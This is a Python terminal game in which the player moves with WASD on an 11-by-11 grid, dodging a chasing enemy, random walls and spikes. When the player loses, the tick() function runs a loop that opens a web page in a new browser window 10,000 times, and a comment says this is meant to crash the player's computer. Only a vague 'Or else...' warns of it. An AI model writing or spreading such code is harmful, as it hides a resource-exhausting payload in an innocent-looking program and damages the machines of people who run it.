import numpy as np
import os
import keyboard
import random
import time
import webbrowser
#import keyboard


rows, cols = 11, 11
#grid = np.zeros((rows, cols), dtype=str) # Create a grid of zeros with integer type
grid = np.full((rows, cols), ' ')
#print(grid)
# Output:
# [[0 0 0 0]
#  [0 0 0 0]
#  [0 0 0 0]]

xpos = 5
ypos = 5
ticks_done = 0
spikechance = 2
tickrate = 0.25 #seconds per tick
# 0 = up
# 1 = left
# 2 = down
# 3 = right
xposE = 8
yposE = 8

def tick():
	global yposE, xposE
	move = random.randint(0,1)
	if move == 0: # X-axis
		if xposE > xpos: #left
			grid[yposE, xposE] = " "
			xposE -= 1
			if xposE < 0:
				xposE = 0
			if grid[yposE, xposE] == "■":
				xposE += 1
		elif xposE < xpos: #right
			grid[yposE, xposE] = " "
			xposE += 1
			if xposE >= cols:
				xposE = cols - 1
			if grid[yposE, xposE] == "■":
				xposE -= 1
	elif move == 1: # Y-axis
		if yposE > ypos: #up
			grid[yposE, xposE] = " "
			yposE -= 1
			if yposE < 0:
				yposE = 0
			if grid[yposE, xposE] == "■":
				yposE += 1
		elif yposE < ypos: #down
			grid[yposE, xposE] = " "
			yposE += 1
			if yposE >= rows:
				yposE = rows - 1
			if grid[yposE, xposE] == "■":
				yposE -= 1
	if grid[ypos, xpos] == "#" or grid[ypos, xpos] == "X":
		os.system("cls")
		print("You lose.")
		print("Say goodbye to your GPU.")
		time.sleep(1)
		i = 0
		while i < 10000: #literally crash the player's computer if they lose'
			webbrowser.open_new("https://downloadmoreram.com/")
			i += 1
		exit()
	wallX = random.randint(0, cols - 1)
	wallY = random.randint(0, rows - 1)
	grid[wallY, wallX] = "■"

	spike = random.randint(1, spikechance)
	if spikechance == 2:
		spikeX = random.randint(0, cols - 1)
		spikeY = random.randint(0, rows - 1)
		grid[spikeY, spikeX] = "X"
		
	





# Accessing and modifying elements:
while True:
	os.system("cls")
	grid[ypos, xpos] = "Ω"
	grid[yposE, xposE] = "X"
	print("WASD to move. Avoid the #. Or else...")
	print(grid)
	print(xpos)
	print(ypos)
	print("Score: " + str(ticks_done))
	ticks_done += 1
	time.sleep(tickrate)
  #x = input("How would you like to move?")
	while True:
		
		if keyboard.is_pressed("w"):
			grid[ypos, xpos] = " "
			ypos -= 1
			if ypos < 0:
				ypos = 0
			if grid[ypos, xpos] == "■":
				ypos += 1
			tick()
			
			
			break
		elif keyboard.is_pressed("s"):
			grid[ypos, xpos] = " "
			ypos += 1
			if ypos >= rows:
				ypos = rows - 1
			if grid[ypos, xpos] == "■":
				ypos -= 1
			tick()
			
			
			break
		elif keyboard.is_pressed("a"):
			grid[ypos, xpos] = " "
			xpos -= 1
			if xpos < 0:
				xpos = 0
			if grid[ypos, xpos] == "■":
				xpos += 1
			tick()
			
			
			break
		elif keyboard.is_pressed("d"):
			grid[ypos, xpos] = " "
			xpos += 1
			if xpos >= cols:
				xpos = cols - 1
			if grid[ypos, xpos] == "■":
				xpos -= 1
			tick()
			
			
			break


  
